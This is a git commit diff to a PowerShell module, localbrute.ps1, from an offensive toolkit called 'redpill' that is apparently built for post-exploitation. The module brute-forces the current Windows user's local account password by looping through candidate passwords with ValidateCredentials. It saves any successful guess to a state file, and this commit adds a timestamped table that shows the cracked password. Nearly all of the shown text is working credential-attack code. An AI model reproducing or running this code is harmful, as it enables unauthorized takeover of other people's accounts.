49606e2e8ffa7fff3e9b81498830fd3376d910a8
root <root@localhost.localdomain>
2021-03-14 18:52:43 +0000

    redpill v1.2.6 - CredsPhish [Brute Force User Accout Password]

--- modules/localbrute.ps1
+++ modules/localbrute.ps1
@@ -11,9 +11,10 @@
   }
   
   $user = [Environment]::UserName
+  $TimeStampStart = Get-Date -format "HH:mm:ss"
   $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | select -last 1) -split(":")
   $i = $ii[2]/1
-  if ($debug) {Write-Host "`nBrute Force $user account" -ForeGroundColor Yellow;echo "-------------------------"}
+  if ($debug) {Write-Host "`nBrute Force [ $user ] account" -ForeGroundColor Yellow;echo "-----------------------------"}
   try {
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
     $t = [DirectoryServices.AccountManagement.ContextType]::Machine
@@ -22,7 +23,25 @@
       if ($debug) {echo "DEBUG: trying password [${i}]: $p"}
       if ($a.ValidateCredentials($u,$p)) {
         echo "${u}:${d}:True:${p}" >> localbrute.state
-        Write-Host "`nPassword for $u account found: $p" -ForeGroundColor Green -BackGroundColor Black
+
+        ## Create Data Table for output
+        $TimeStampEnd = Get-Date -format "HH:mm:ss"
+        $mytable = New-Object System.Data.DataTable
+        $mytable.Columns.Add("Attempt")|Out-Null
+        $mytable.Columns.Add("StartTime")|Out-Null
+        $mytable.Columns.Add("EndTime")|Out-Null
+        $mytable.Columns.Add("Account")|Out-Null
+        $mytable.Columns.Add("Password")|Out-Null
+        $mytable.Rows.Add("$i",
+                          "$TimeStampStart",
+                          "$TimeStampEnd",
+                          "$user",
+                          "$p")|Out-Null
+
+        ## Display Data Table
+        $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
+        Write-Host "";Get-Content -Path "$Env:TMP\KeyDump.log"
+        Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
         return
       }
       $i++
